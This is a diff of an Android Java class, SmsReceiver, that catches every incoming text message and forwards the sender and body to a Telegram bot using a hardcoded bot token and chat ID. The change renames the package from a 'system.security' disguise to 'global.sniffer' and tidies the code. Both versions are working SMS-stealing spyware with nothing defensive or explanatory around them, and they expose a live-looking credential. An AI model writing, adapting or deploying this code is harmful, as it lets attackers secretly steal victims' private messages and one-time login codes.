@@ -1,4 +1,4 @@
-package com.system.security;
+package com.v8.global.sniffer;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -6,14 +6,13 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
+import java.io.IOException;
 
+import okhttp3.Call;
 import okhttp3.FormBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
-import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
@@ -26,34 +25,22 @@ public class SmsReceiver extends BroadcastReceiver {
         if (bundle != null) {
             Object[] pdus = (Object[]) bundle.get("pdus");
             for (Object pdu : pdus) {
-                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
-                String sender = message.getDisplayOriginatingAddress();
-                String body = message.getMessageBody();
-                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
-                
-                sendToTelegram("📨 رسالة جديدة:\nمن: " + sender + "\n" + body + "\n⏰ " + time);
+                SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
+                String sender = msg.getDisplayOriginatingAddress();
+                String body = msg.getMessageBody();
+                sendToTelegram("📨 SMS from " + sender + ":\n" + body);
             }
         }
     }
 
-    private void sendToTelegram(String message) {
-        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
-        
-        FormBody formBody = new FormBody.Builder()
-                .add("chat_id", CHAT_ID)
-                .add("text", message)
-                .build();
-        
+    private void sendToTelegram(String text) {
         Request request = new Request.Builder()
-                .url(url)
-                .post(formBody)
+                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
+                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                 .build();
-        
         client.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override
-            public void onResponse(okhttp3.Call call, okhttp3.Response response) {}
-            @Override
-            public void onFailure(okhttp3.Call call, IOException e) {}
+            @Override public void onResponse(Call call, Response response) { response.close(); }
+            @Override public void onFailure(Call call, IOException e) {}
         });
     }
 }
